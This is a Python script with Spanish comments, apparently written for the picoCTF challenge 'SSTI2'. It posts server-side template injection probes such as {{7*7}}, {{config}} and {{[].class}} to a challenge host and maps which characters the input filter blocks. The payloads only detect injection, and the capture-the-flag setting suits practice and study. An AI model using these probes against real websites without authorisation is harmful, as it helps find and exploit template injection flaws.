#!/usr/bin/env python3
import requests
import re

print("=" * 60)
print("RESOLVIENDO SSTI2")
print("=" * 60)

url = "http://shape-facility.picoctf.net:49832/"

print(f"\n[1] Conectando a: {url}")

# Primero, hacer una petición GET para ver la página
try:
    response = requests.get(url)
    print(f"  Status: {response.status_code}")
    print(f"  Longitud respuesta: {len(response.text)} caracteres")
    
    # Buscar formularios
    if '<form' in response.text:
        print("  ✓ Formulario encontrado")
    
    # Buscar campos de entrada
    if '<input' in response.text or '<textarea' in response.text:
        print("  ✓ Campos de entrada encontrados")
        
except Exception as e:
    print(f"  ✗ Error: {e}")

print("\n[2] Probando payloads SSTI básicos:")

# Payloads comunes de SSTI para diferentes motores de plantillas
payloads = [
    # Jinja2/Flask (Python)
    ("{{7*7}}", "49", "Jinja2 básico"),
    ("{{7*'7'}}", "7777777", "Jinja2 multiplicación string"),
    ("{{config}}", "Config", "Jinja2 config"),
    
    # Intentos de bypass de filtros
    ("{{'7'*7}}", "7777777", "Comillas simples"),
    ("{{7**2}}", "49", "Potencia"),
    ("{{[].class}}", "class", "Acceso a clase"),
    
    # Sin llaves (por si filtra {})
    ("7*7", "49", "Sin llaves"),
    ("%7B%7B7*7%7D%7D", "49", "URL encoded"),
]

for payload, expected, description in payloads:
    print(f"\n  Probando: {description}")
    print(f"    Payload: {payload}")
    
    try:
        # Intentar POST (más común en formularios)
        data = {
            'input': payload,
            'text': payload,
            'message': payload,
            'content': payload,
            'announcement': payload,
            'name': payload,
            'value': payload
        }
        
        response = requests.post(url, data=data)
        
        # Buscar el resultado esperado
        if expected in response.text:
            print(f"    ✓ SSTI DETECTADO! Encontrado: {expected}")
            print(f"    Respuesta parcial: {response.text[:200]}...")
            
            # Si funciona, guardar para análisis
            with open('/workspace/ssti_response.html', 'w') as f:
                f.write(response.text)
            break
        else:
            # Buscar cualquier evaluación
            if "49" in response.text and "7*7" in payload:
                print(f"    ✓ Posible SSTI - se evaluó la expresión")
            elif "7777777" in response.text and "7" in payload:
                print(f"    ✓ Posible SSTI - multiplicación de strings")
            else:
                print(f"    ✗ No detectado")
                
    except Exception as e:
        print(f"    ✗ Error: {e}")

print("\n[3] Analizando filtros y restricciones:")

# Probar qué caracteres están bloqueados
test_chars = [
    ('{{}}', 'Llaves dobles'),
    ('[]', 'Corchetes'),
    ('()', 'Paréntesis'),
    ('__', 'Doble guión bajo'),
    ('.', 'Punto'),
    ('|', 'Pipe'),
    ('_', 'Guión bajo'),
    ("'", 'Comilla simple'),
    ('"', 'Comilla doble'),
    ('`', 'Backtick'),
    ('%', 'Porcentaje'),
    ('$', 'Dólar'),
    ('#', 'Hash'),
    ('&', 'Ampersand'),
    ('<>', 'Mayor/menor'),
]

blocked = []
allowed = []

for char, name in test_chars:
    try:
        data = {'input': char, 'text': char, 'message': char, 'announcement': char}
        response = requests.post(url, data=data)
        
        if "blocked" in response.text.lower() or "not allowed" in response.text.lower() or "invalid" in response.text.lower():
            blocked.append(name)
        elif char in response.text:
            allowed.append(name)
    except:
        pass

if blocked:
    print(f"  Caracteres bloqueados: {', '.join(blocked)}")
if allowed:
    print(f"  Caracteres permitidos: {', '.join(allowed)}")

print("\n" + "=" * 60)